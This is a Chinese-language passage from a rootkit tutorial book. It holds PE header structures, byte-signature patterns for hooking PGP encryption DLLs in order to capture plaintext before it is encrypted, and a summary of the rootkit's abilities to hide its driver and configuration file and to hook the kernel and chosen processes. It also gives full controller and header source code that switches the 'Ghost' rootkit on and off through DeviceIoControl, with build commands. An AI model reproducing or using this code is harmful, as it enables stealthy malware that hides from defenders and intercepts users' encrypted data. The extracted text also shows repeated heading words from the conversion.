//
// Directory format.
//
typedef struct _IMAGE_DATA_DIRECTORY {
DWORD
VirtualAddress;
DWORD
Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES
16
//
// Optional header format.
//
typedef struct _IMAGE_OPTIONAL_HEADER {
//
// Standard fields.
//
WORD
Magic;
BYTE
MajorLinkerVersion;
BYTE
MinorLinkerVersion;
DWORD
SizeOfCode;
DWORD
SizeOfInitializedData;
DWORD
SizeOfUninitializedData;
DWORD
AddressOfEntryPoint;
DWORD
BaseOfCode;
DWORD
BaseOfData;
//
// NT additional fields.
//
DWORD
ImageBase;
DWORD
SectionAlignment;
DWORD
FileAlignment;
WORD
MajorOperatingSystemVersion;
WORD
MinorOperatingSystemVersion;
WORD
MajorImageVersion;
WORD
MinorImageVersion;
WORD
MajorSubsystemVersion;
WORD
MinorSubsystemVersion;
DWORD
Win32VersionValue;
DWORD
SizeOfImage;
DWORD
SizeOfHeaders;
DWORD
CheckSum;
WORD
Subsystem;
WORD
DllCharacteristics;
DWORD
SizeOfStackReserve;
DWORD
SizeOfStackCommit;
DWORD
SizeOfHeapReserve;
DWORD
SizeOfHeapCommit;
DWORD
LoaderFlags;
DWORD
NumberOfRvaAndSizes;
IMAGE_DATA_DIRECTORY
DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER, *PIMAGE_OPTIONAL_HEADER;
//
// Export Format
//
typedef struct _IMAGE_EXPORT_DIRECTORY {
DWORD
Characteristics;
DWORD
TimeDateStamp;
WORD
MajorVersion;
WORD
MinorVersion;
DWORD
Name;
DWORD
Base;
DWORD
NumberOfFunctions;
DWORD
NumberOfNames;
DWORD
AddressOfFunctions;
// RVA from base of image
DWORD
AddressOfNames;
// RVA from base of image
DWORD
AddressOfNameOrdinals;
// RVA from base of image
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
// Directory Entries
#define IMAGE_DIRECTORY_ENTRY_EXPORT
0
// Export Directory
#endif
一旦编译并加载后，点击 Checked DDK 图标并使用第一二章编写的 SCMLoader.exe，
你就可以打开服务了，使用“net start MyDeviceDriver”来过滤运往 PGP 加密的数据。
使用 Ghost
Ghost
Ghost
Ghost 来分块 PGP
PGP
PGP
PGP 编码
为了演示这个例子中定义的用户钩子，你需要下载 PGP Desktop9 版本。截止本书编写
为止，PGP 桌面专业版 9 可以在 www.pgp.com/downloads/index.html 下载到。 下载的这个
版本允许免费试用 30 天，这些时间对于演示本章用户层钩子以及以下章节是足够的了。另
一方面，如果你经常使用免费版本的 PGP（如版本 6 到 8），你可以使用下面样式中的一个：
PGP version 6 pre-encode pattern (for PGP_SDK.dll):
0x81, 0xEC, 0xC8, 0x00, 0x00, 0x00, 0x53, 0x55, 0x8B, 0xAC, 0x24, 0xD8, 0x00, 0x00,
0x00, 0x57, 0xB9, 0x25, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x8D, 0x7C, 0x24, 0x14, 0x6A
PGP version 7 pre-encode pattern (for PGPsdk.dll):
0x81, 0xEC, 0xC0, 0x00, 0x00, 0x00, 0x53, 0x55, 0x8B, 0xAC, 0x24, 0xD0, 0x00, 0x00,
0x00, 0x57, 0xB9, 0x23, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x8D, 0x7C, 0x24, 0x18, 0x6A
PGP version 8 pre-encode pattern (for PGPsdk.dll):
0x81, 0xEC, 0xC4, 0x00, 0x00, 0x00, 0x53, 0x55, 0x8B, 0xAC, 0x24, 0xD4, 0x00, 0x00,
0x00, 0x57, 0xB9, 0x23, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x8D, 0x7C, 0x24, 0x18, 0x6A
总结
这章完整的讲述了进程注入应用程序内存所需的重要部分。为了使代码尽可能简单，只
保持最小功能函数被执行。一个完整的 PGP 监视器需要包括各个 PGP SDK DLL 可能版本
的样式同时需要为各个版本 PGP SC DLL 中的 Self Decrypting Archive （自解密库）附加一
个钩子，还需要为使用 PGP9 的多文件加密创建另一个钩子。幸运的是，使用提供的工具，
并对 IDA 有比较深刻的了解，这个附加函数功能可以很快的被添加完成。图 4-4 所示一个
完整的 PGP 监视器。
图 4-4
我们现在已经有了一个具有如下个能的 rootkit：
隐藏设备驱动程序条目
隐藏它的配置文件
挂钩操作系统内核
挂钩所选的被操作系统加载的进程
我们离一个功能完整的 rootkit 已经很近了。当然，我们仍不能说可以通过本地应用程
序或远程应用程序来控制 rootkit。在我们进入通讯编程前，我们还需要懂得基本的 I/O 系统。
下章介绍 rootkit 至关重要的部分：I/O 处理。
笫五章 I/O
I/O
I/O
I/O 处理
概述
本章想你介绍 I/O 处理系统。I/O 处理，命名管道，和共享内存这些可以用来有效的实
现内核模式和用户模式进程间的通信。在这三种方式中，I/O 处理可能是最容易理解和实现
的了。因为我们的 rootkit 是作为一个设备驱动程序加载到内核内存中执行，控制应用程序
通常被加载到用户内存，因此就需要这种通信方式。除了各自的内存区域外，内核和用户模
式进程通常使用各自的堆栈。这就有效的阻止了利用函数传递参数即使你可以从一个交替内
存区域标识一个函数的位置。
本章包括如下内容：
DeviceIoControl 函数
一个基本的 rootkit 控制应用程序
基本的 I/O 处理在 rootkit 中的应用
一个基本的 rootkit 命令
测试一个基本的 rootkit 命令
使用 DeviceIoControl
DeviceIoControl
DeviceIoControl
DeviceIoControl
Rootkit 通常作为设备驱动程序来执行，通常需要与外部用户层应用程序通信的能力。
这些外部应用程序使用不同的堆栈和不同的内存空间；他们可以使用不同的函数并在不同的
权限级别下操作。在驱动程序和应用程序间实现通信必须通过一个不被上述因素影响的通道
来实现。这个通信通道由 DeviceIoControl 函数提供。图 5-1 所示基本 I/O 控制模型。
图 5-1
本章这个详细的例子将为 rootkit 增加一个开/关转换。 这个开/关转换将由一个标准的
Windows 控制台程序控制，并通过 DeviceIoControl 与 rootkit 进行通讯。在原始的 PGP 加密
函数前在注入函数(added in Chapter 4)被调用时将需要 DeviceIoControl。这样可以使注入函
数检测开/关转换状态从而确定允许进程还是封锁进程。
这个函数功能需要通过创建三个新文件和修改四个已有文件来控制 rootkit 本地执行。
新文件如下：
Controller.c
IoManager.c
IoManager.h
下面是要修改的文件：
Ghost.c
Ghost.c
injectManager.c
SOURCES
控制台应用程序
应用程序用来控制 rootkit，简单来说就是需要接受一个开或关的命令并将命令传送给
rootkit。这是通过 rootkit 打开已发布设备驱动并通过 DeviceIoControl 来发送一条指令来完成
的。
代码如下节所示。
Controller.c
Controller.c
Controller.c
Controller.c
文件 Controller.c 接受一个开或关的命令并发送 GHOST_ON 或 GHOST_OFF 给在
GHOST_DEVICE_OPEN_NAME 中所找到的设备驱动。这些定义已经被增加到一个新文件
IoManager.h 中。这个新文件可以被任何需要与 rootkit 通讯的应用程序包括：
// Controller
// Copyright Ric Vieler, 2006
// Send an on/off command to MyDeviceDriver
#include 
#include 
#include 
#include "IoManager.h"
void main(int argc, char *argv[])
{
HANDLE deviceHandle;
GHOST_IOCTLDATA control = { 0 };
ULONG status = 0;
if(( argc < 2 ) || ((stricmp(argv[1],"on") != 0)) && ((stricmp(argv[1],"off") !=
0)))
{
printf ("Use Controller on\n");
printf ("or
Controller off\n");
return;
}
deviceHandle = CreateFile( GHOST_DEVICE_OPEN_NAME,
GENERIC_READ | GENERIC_WRITE,
0,
NULL,
OPEN_EXISTING,
FILE_ATTRIBUTE_NORMAL,
NULL);
if (deviceHandle == INVALID_HANDLE_VALUE)
{
printf ("Could not find MyDeviceDriver.\n");
return;
}
if(stricmp(argv[1],"on") == 0)
control.command = GHOST_ON;
else
control.command = GHOST_OFF;
if( DeviceIoControl(deviceHandle,
GHOST_ON_OFF_COMMAND,
&control,
sizeof(control), // input
(PVOID)&control,
sizeof(control), // output
&status,
NULL ) )
printf ("MyDeviceDriver %s.\n", control.command == GHOST_ON ? "on" : "off" );
else
printf ("DeviceIoControl failed.\n");
CloseHandle(deviceHandle);
}
IoManager.h
IoManager.h
IoManager.h
IoManager.h
文件 Controller.h 提供了 rootkit 和控制程序所需要的函数定义。用来区分不止一个程序
使用的单一文件，在别处定义一个关键字，_GHOST_ROOTKIT_。rootkit 必须定义这个关
键字，同时控制程序则不准。这样允许 rootkit 和控制程序在不需要控制程序知道任何 rootkit
内部结构的前提下来共享 I/O 通讯定义：
// Copyright Ric Vieler, 2006
// Definitions for Ghost IO control
#ifndef _GHOST_IO_H_
#define _GHOST_IO_H_
// Use CreateFile( GHOST_DEVICE_OPEN_NAME,,, externally
// Use GHOST_DEVICE_CREATE_NAME internally to create device
// Use GHOST_DEVICE_LINK_NAME internally to create device link
#define GHOST_DEVICE_CREATE_NAME L"\\Device\\MyDeviceDriver"
#define GHOST_DEVICE_LINK_NAME L"\\DosDevices\\MyDeviceDriver"
#define GHOST_DEVICE_OPEN_NAME "\\\\.\\MyDeviceDriver"
// Set command = GHOST_ON or GHOST_OFF for GHOST_ON_OFF_COMMAND
// Get command = GHOST_ON or GHOST_OFF for GHOST_STATUS_COMMAND
typedef struct
{
Int
command;
} GHOST_IOCTLDATA;
// definitions from ntddk.h
// (these won't be defined in user mode apps)
#ifndef CTL_CODE
#define CTL_CODE( DeviceType, Function, Method, Access ) (
\
((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method) \
)
#endif
#ifndef FILE_DEVICE_UNKNOWN
#define FILE_DEVICE_UNKNOWN 0x00000022
#endif
#ifndef METHOD_BUFFERED
#define METHOD_BUFFERED 0
#endif
#ifndef FILE_ANY_ACCESS
#define FILE_ANY_ACCESS 0
#endif
// Use these to command the rootkit!
#define
GHOST_ON_OFF_COMMAND
CTL_CODE(FILE_DEVICE_UNKNOWN,
0x800,
METHOD_BUFFERED,
FILE_ANY_ACCESS)
#define
GHOST_STATUS_COMMAND
CTL_CODE(FILE_DEVICE_UNKNOWN,
0x801,
METHOD_BUFFERED,
FILE_ANY_ACCESS)
#define GHOST_OFF 0
#define GHOST_ON 1
// Internal functions
#ifdef _GHOST_ROOTKIT_
NTSTATUS
OnDeviceControl( PFILE_OBJECT FileObject, BOOLEAN Wait,
PVOID InputBuffer, ULONG InputBufferLength,
PVOID OutputBuffer, ULONG OutputBufferLength,
ULONG IoControlCode, PIO_STATU***LOCK IoStatus,
PDEVICE_OBJECT DeviceObject );
NTSTATUS OnDispatch( PDEVICE_OBJECT DeviceObject, PIRP Irp );
#endif
#endif
BuildController.bat
BuildController.bat
BuildController.bat
BuildController.bat
如同 SCMLoader.c 和 SCMUnloader.c 的情况一样，Controller.c 可以使用如下命令或一个
方便的批处理文件来编译完成：
cl -nologo -W3 -O2 Controller.c /link /NOLOGO user32.lib advapi32.lib
设备驱动内部的 IO
IO
IO
IO 处理
在编译完 Controller.c 后，可以使用 Controller.exe 来向 rootkit 发送开或关的命令。然而，
需要增强 rootkit 来处理这些命令。为了达到这一目的 Ghost.c、Ghost.h、injectManager.c 和
SOURCES 需要被修改，并且 IoManager.c 需要被创建。
对 Ghost.h 文件进行如下修改：
// Flag for IoManager.h